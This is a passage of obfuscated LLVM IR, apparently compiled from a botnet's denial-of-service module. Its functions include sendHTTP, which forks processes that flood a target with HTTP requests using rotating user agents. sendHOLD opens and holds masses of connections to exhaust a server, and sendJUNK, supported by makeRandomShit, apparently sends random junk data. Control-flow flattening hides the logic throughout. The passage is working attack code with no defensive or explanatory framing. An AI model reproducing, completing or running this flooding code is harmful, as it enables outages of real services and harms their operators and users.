  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i64 @time(i64* null) #2
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %25 = load i8*, i8** %7, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #2
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #2
  %33 = sext i32 %32 to i64
  %34 = urem i64 %33, 36
  %35 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #2
  store i32 0, i32* %14, align 4
  %switchVar = alloca i32
  store i32 553985760, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 553985760, label %38
    i32 686667927, label %43
    i32 -579457010, label %47
    i32 1706559739, label %48
    i32 -45881259, label %54
    i32 -1932851104, label %61
    i32 -1438862188, label %69
    i32 -911283488, label %70
    i32 1295951707, label %71
    i32 575924847, label %72
    i32 -1235998420, label %75
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %39 = load i32, i32* %14, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  %42 = select i1 %41, i32 686667927, i32 -1235998420
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = call i32 @fork() #2
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -579457010, i32 1295951707
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1706559739, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %15, align 4
  %50 = sext i32 %49 to i64
  %51 = call i64 @time(i64* null) #2
  %52 = icmp sgt i64 %50, %51
  %53 = select i1 %52, i32 -45881259, i32 -911283488
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i8*, i8** %8, align 8
  %56 = load i16, i16* %9, align 2
  %57 = call i32 @socket_connect(i8* %55, i16 zeroext %56)
  store i32 %57, i32* %17, align 4
  %58 = load i32, i32* %17, align 4
  %59 = icmp ne i32 %58, 0
  %60 = select i1 %59, i32 -1932851104, i32 -1438862188
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %17, align 4
  %63 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %64 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %65 = call i64 @strlen(i8* %64) #10
  %66 = call i64 @write(i32 %62, i8* %63, i64 %65)
  %67 = load i32, i32* %17, align 4
  %68 = call i32 @close(i32 %67)
  store i32 -1438862188, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 1706559739, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  call void @exit(i32 1) #14
  unreachable

; <label>:71:                                     ; preds = %loopEntry
  store i32 575924847, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %14, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %14, align 4
  store i32 553985760, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %72, %71, %69, %61, %54, %48, %47, %43, %38, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %.reg2mem29 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1164297591, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -1164297591, label %first
    i32 1798533430, label %34
    i32 -436539970, label %35
    i32 759217059, label %51
    i32 -1312128761, label %57
    i32 1927677769, label %58
    i32 1656475499, label %63
    i32 781799582, label %NodeBlock3
    i32 -2133275233, label %NodeBlock
    i32 1412422818, label %LeafBlock1
    i32 -662736700, label %LeafBlock
    i32 -687513309, label %74
    i32 -667281175, label %105
    i32 375090134, label %110
    i32 1873701514, label %117
    i32 1891822419, label %122
    i32 818683254, label %123
    i32 -1419519403, label %124
    i32 1472075178, label %133
    i32 -1220763620, label %134
    i32 1316809454, label %166
    i32 -1384953119, label %177
    i32 -875898411, label %188
    i32 -2137336451, label %193
    i32 -637139906, label %194
    i32 -2009897870, label %198
    i32 1825962976, label %209
    i32 654265990, label %210
    i32 1914617263, label %211
    i32 1051570321, label %212
    i32 1067874680, label %221
    i32 120597499, label %222
    i32 -312117942, label %254
    i32 584577109, label %265
    i32 1149079826, label %NewDefault
    i32 -1668266662, label %266
    i32 1952519665, label %267
    i32 -2041071547, label %270
    i32 -1743692001, label %271
    i32 -2045905931, label %273
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 1798533430, i32 -436539970
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -2045905931, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload28 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload28 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call i64 @time(i64* null) #2
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add nsw i64 %46, %48
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %16, align 4
  store i32 759217059, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %16, align 4
  %53 = sext i32 %52 to i64
  %54 = call i64 @time(i64* null) #2
  %55 = icmp sgt i64 %53, %54
  %56 = select i1 %55, i32 -1312128761, i32 -1743692001
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 1927677769, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp slt i32 %59, %60
  %62 = select i1 %61, i32 1656475499, i32 -2041071547
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %8, align 4
  %65 = sext i32 %64 to i64
  %.reload27 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %66 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload27, i64 %65
  %67 = getelementptr inbounds %struct.state_t, %struct.state_t* %66, i32 0, i32 1
  %68 = load i8, i8* %67, align 4
  %69 = zext i8 %68 to i32
  store i32 %69, i32* %.reg2mem29
  store i32 781799582, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload33 = load volatile i32, i32* %.reg2mem29
  %Pivot4 = icmp slt i32 %.reload33, 1
  %70 = select i1 %Pivot4, i32 -662736700, i32 -2133275233
  store i32 %70, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem29
  %Pivot = icmp slt i32 %.reload31, 2
  %71 = select i1 %Pivot, i32 818683254, i32 1412422818
  store i32 %71, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf2 = icmp eq i32 %.reload30, 2
  %72 = select i1 %SwitchLeaf2, i32 1914617263, i32 1149079826
  store i32 %72, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload32 = load volatile i32, i32* %.reg2mem29
  %SwitchLeaf = icmp eq i32 %.reload32, 0
  %73 = select i1 %SwitchLeaf, i32 -687513309, i32 1149079826
  store i32 %73, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload26, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  store i32 %75, i32* %79, align 8
  %80 = load i32, i32* %8, align 4
  %81 = sext i32 %80 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %81
  %83 = getelementptr inbounds %struct.state_t, %struct.state_t* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %86
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %89, i32 3, i8* null)
  %91 = or i32 %90, 2048
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %84, i32 4, i32 %91)
  %93 = load i32, i32* %8, align 4
  %94 = sext i32 %93 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %94
  %96 = getelementptr inbounds %struct.state_t, %struct.state_t* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 8
  %98 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %99 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %99, %struct.sockaddr** %98, align 8
  %100 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %101 = load %struct.sockaddr*, %struct.sockaddr** %100, align 8
  %102 = call i32 @connect(i32 %97, %struct.sockaddr* %101, i32 16)
  %103 = icmp ne i32 %102, -1
  %104 = select i1 %103, i32 375090134, i32 -667281175
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = call i32* @__errno_location() #13
  %107 = load i32, i32* %106, align 4
  %108 = icmp ne i32 %107, 115
  %109 = select i1 %108, i32 375090134, i32 1873701514
  store i32 %109, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %8, align 4
  %112 = sext i32 %111 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %112
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %113, i32 0, i32 0
  %115 = load i32, i32* %114, align 8
  %116 = call i32 @close(i32 %115)
  store i32 1891822419, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %8, align 4
  %119 = sext i32 %118 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %119
  %121 = getelementptr inbounds %struct.state_t, %struct.state_t* %120, i32 0, i32 1
  store i8 1, i8* %121, align 4
  store i32 1891822419, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  store i32 -1668266662, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -1419519403, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %126 = getelementptr inbounds [16 x i64], [16 x i64]* %125, i64 0, i64 0
  %127 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %126) #2, !srcloc !7
  %128 = extractvalue { i64, i64* } %127, 0
  %129 = extractvalue { i64, i64* } %127, 1
  %130 = trunc i64 %128 to i32
  store i32 %130, i32* %18, align 4
  %131 = ptrtoint i64* %129 to i64
  %132 = trunc i64 %131 to i32
  store i32 %132, i32* %19, align 4
  store i32 1472075178, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  store i32 -1220763620, i32* %switchVar
  br label %loopEnd

; <label>:134:                                    ; preds = %loopEntry
  %135 = load i32, i32* %8, align 4
  %136 = sext i32 %135 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %137 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %136
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %137, i32 0, i32 0
  %139 = load i32, i32* %138, align 8
  %140 = srem i32 %139, 64
  %141 = zext i32 %140 to i64
  %142 = shl i64 1, %141
  %143 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %145
  %147 = getelementptr inbounds %struct.state_t, %struct.state_t* %146, i32 0, i32 0
  %148 = load i32, i32* %147, align 8
  %149 = sdiv i32 %148, 64
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds [16 x i64], [16 x i64]* %143, i64 0, i64 %150
  %152 = load i64, i64* %151, align 8
  %153 = or i64 %152, %142
  store i64 %153, i64* %151, align 8
  %154 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %154, align 8
  %155 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %155, align 8
  %156 = load i32, i32* %8, align 4
  %157 = sext i32 %156 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %158 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %157
  %159 = getelementptr inbounds %struct.state_t, %struct.state_t* %158, i32 0, i32 0
  %160 = load i32, i32* %159, align 8
  %161 = add nsw i32 %160, 1
  %162 = call i32 @select(i32 %161, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %162, i32* %15, align 4
  %163 = load i32, i32* %15, align 4
  %164 = icmp eq i32 %163, 1
  %165 = select i1 %164, i32 1316809454, i32 -637139906
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %167 = load i32, i32* %8, align 4
  %168 = sext i32 %167 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %168
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %169, i32 0, i32 0
  %171 = load i32, i32* %170, align 8
  %172 = bitcast i32* %14 to i8*
  %173 = call i32 @getsockopt(i32 %171, i32 1, i32 4, i8* %172, i32* %13) #2
  %174 = load i32, i32* %14, align 4
  %175 = icmp ne i32 %174, 0
  %176 = select i1 %175, i32 -1384953119, i32 -875898411
  store i32 %176, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 0
  %182 = load i32, i32* %181, align 8
  %183 = call i32 @close(i32 %182)
  %184 = load i32, i32* %8, align 4
  %185 = sext i32 %184 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %185
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %186, i32 0, i32 1
  store i8 0, i8* %187, align 4
  store i32 -2137336451, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 1
  store i8 2, i8* %192, align 4
  store i32 -2137336451, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  store i32 654265990, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* %15, align 4
  %196 = icmp eq i32 %195, -1
  %197 = select i1 %196, i32 -2009897870, i32 1825962976
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 8
  %204 = call i32 @close(i32 %203)
  %205 = load i32, i32* %8, align 4
  %206 = sext i32 %205 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %207 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %206
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %207, i32 0, i32 1
  store i8 0, i8* %208, align 4
  store i32 1825962976, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 654265990, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  store i32 -1668266662, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 1051570321, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %214 = getelementptr inbounds [16 x i64], [16 x i64]* %213, i64 0, i64 0
  %215 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %214) #2, !srcloc !8
  %216 = extractvalue { i64, i64* } %215, 0
  %217 = extractvalue { i64, i64* } %215, 1
  %218 = trunc i64 %216 to i32
  store i32 %218, i32* %20, align 4
  %219 = ptrtoint i64* %217 to i64
  %220 = trunc i64 %219 to i32
  store i32 %220, i32* %21, align 4
  store i32 1067874680, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  store i32 120597499, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i32, i32* %8, align 4
  %224 = sext i32 %223 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 8
  %228 = srem i32 %227, 64
  %229 = zext i32 %228 to i64
  %230 = shl i64 1, %229
  %231 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %232 = load i32, i32* %8, align 4
  %233 = sext i32 %232 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %234 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %233
  %235 = getelementptr inbounds %struct.state_t, %struct.state_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 8
  %237 = sdiv i32 %236, 64
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds [16 x i64], [16 x i64]* %231, i64 0, i64 %238
  %240 = load i64, i64* %239, align 8
  %241 = or i64 %240, %230
  store i64 %241, i64* %239, align 8
  %242 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %242, align 8
  %243 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %243, align 8
  %244 = load i32, i32* %8, align 4
  %245 = sext i32 %244 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 8
  %249 = add nsw i32 %248, 1
  %250 = call i32 @select(i32 %249, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %250, i32* %15, align 4
  %251 = load i32, i32* %15, align 4
  %252 = icmp ne i32 %251, 0
  %253 = select i1 %252, i32 -312117942, i32 584577109
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i32, i32* %8, align 4
  %256 = sext i32 %255 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %256
  %258 = getelementptr inbounds %struct.state_t, %struct.state_t* %257, i32 0, i32 0
  %259 = load i32, i32* %258, align 8
  %260 = call i32 @close(i32 %259)
  %261 = load i32, i32* %8, align 4
  %262 = sext i32 %261 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %263 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %262
  %264 = getelementptr inbounds %struct.state_t, %struct.state_t* %263, i32 0, i32 1
  store i8 0, i8* %264, align 4
  store i32 584577109, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  store i32 -1668266662, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -1668266662, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 1952519665, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32, i32* %8, align 4
  %269 = add nsw i32 %268, 1
  store i32 %269, i32* %8, align 4
  store i32 1927677769, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  store i32 759217059, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %272)
  store i32 -2045905931, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %271, %270, %267, %266, %NewDefault, %265, %254, %222, %221, %212, %211, %210, %209, %198, %194, %193, %188, %177, %166, %134, %133, %124, %123, %122, %117, %110, %105, %74, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %63, %58, %57, %51, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @realrand(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %5 = call i64 @time(i64* null) #2
  %6 = call i32 @getpid() #2
  %7 = sext i32 %6 to i64
  %8 = add nsw i64 %5, %7
  %9 = trunc i64 %8 to i32
  call void @srand(i32 %9) #2
  %10 = call i32 @rand() #2
  %11 = load i32, i32* %4, align 4
  %12 = add nsw i32 %11, 1
  %13 = load i32, i32* %3, align 4
  %14 = sub nsw i32 %12, %13
  %15 = srem i32 %10, %14
  %16 = load i32, i32* %3, align 4
  %17 = add nsw i32 %15, %16
  ret i32 %17
}

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define void @makeRandomShit(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @time(i64* null) #2
  %7 = trunc i64 %6 to i32
  call void @srand(i32 %7) #2
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -205408452, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -205408452, label %8
    i32 -457930671, label %13
    i32 828936771, label %22
    i32 -1716584175, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* %5, align 4
  %10 = load i32, i32* %4, align 4
  %11 = icmp slt i32 %9, %10
  %12 = select i1 %11, i32 -457930671, i32 -1716584175
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand() #2
  %15 = srem i32 %14, 255
  %16 = add nsw i32 %15, 1
  %17 = trunc i32 %16 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  store i32 828936771, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %5, align 4
  %24 = add nsw i32 %23, 1
  store i32 %24, i32* %5, align 4
  store i32 -205408452, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %22, %13, %8, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %.reg2mem27 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
